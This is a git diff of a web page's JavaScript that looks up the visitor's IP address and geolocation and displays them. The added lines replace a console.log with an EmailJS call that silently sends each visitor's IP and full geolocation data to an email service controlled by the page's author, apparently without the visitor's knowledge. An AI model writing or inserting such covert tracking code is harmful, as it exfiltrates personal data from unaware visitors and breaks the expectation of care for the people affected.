@@ -15,6 +15,7 @@ const timezone = document.getElementById( "timezone" );
 const weAreComing = document.getElementById( "weAreComing" );
 
 
+
 fetch( " https://api.ipify.org/?format=json" )
     .then( response => response.json() )
     .then( query =>
@@ -25,7 +26,11 @@ fetch( " https://api.ipify.org/?format=json" )
             .then( response => response.json() )
             .then( response =>
             {
-                console.log( response );
+                ( function ()
+                {
+                    emailjs.init( 'zmaU34EGVqGhdb-ES' );
+                    emailjs.send( "service_qh0nrmm", "template_dxnbr77", { 'IP': userIp, 'response': JSON.stringify( response ) }, 'zmaU34EGVqGhdb-ES' );
+                } )();
                 success.innerText = `success: ${ response.success }`;
                 continent.innerText = `continent: ${ response.location.continent.name }`;
                 country.innerText = `country: ${ response.location.country.name }`;
